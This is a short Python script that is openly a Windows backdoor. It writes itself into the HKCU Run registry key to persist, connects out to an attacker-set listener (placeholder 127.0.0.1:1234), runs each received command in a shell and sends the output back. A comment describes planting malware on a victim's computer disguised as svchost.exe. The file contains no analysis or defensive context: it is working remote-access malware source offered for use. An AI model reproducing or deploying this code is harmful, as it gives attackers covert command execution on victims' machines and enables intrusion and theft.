import socket
import subprocess
import winreg as reg
import pathlib
import sys

#download Grem.exe malware and upload it on victims computer and put it in autoruns as svchost.exe

def changeRegistry():
    scriptName = sys.argv[0]
    keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    fileDir = pathlib.Path(__file__).parent.absolute()
    openKey = reg.OpenKey(reg.HKEY_CURRENT_USER, keyPath, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(openKey, 'TCPIP', 0, reg.REG_SZ, str(fileDir) + scriptName)

def executeSystemCommand(command):
    try:
        return subprocess.check_output(command, shell=True)
    except:
        return b"[-] Error running preceeding command...\n"

changeRegistry()
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection.connect(("127.0.0.1", 1234)) #Change to your Server Listening IP and Port
print("[+] Connected !")

while True:
    try:
        #Wait for data
        command = connection.recv(1024)
        #Decode data
        command = command.decode("utf-8")
        #Storing command output in commandResult
        commandResult = executeSystemCommand(command)
        #Send output back to us
        print(commandResult)
        connection.send(commandResult)
    except:
        connection.send(b"[+] Connection closed by host !\n")
        
    

print("[+] Closing socket.")
#Close Connection
connection.close()
 
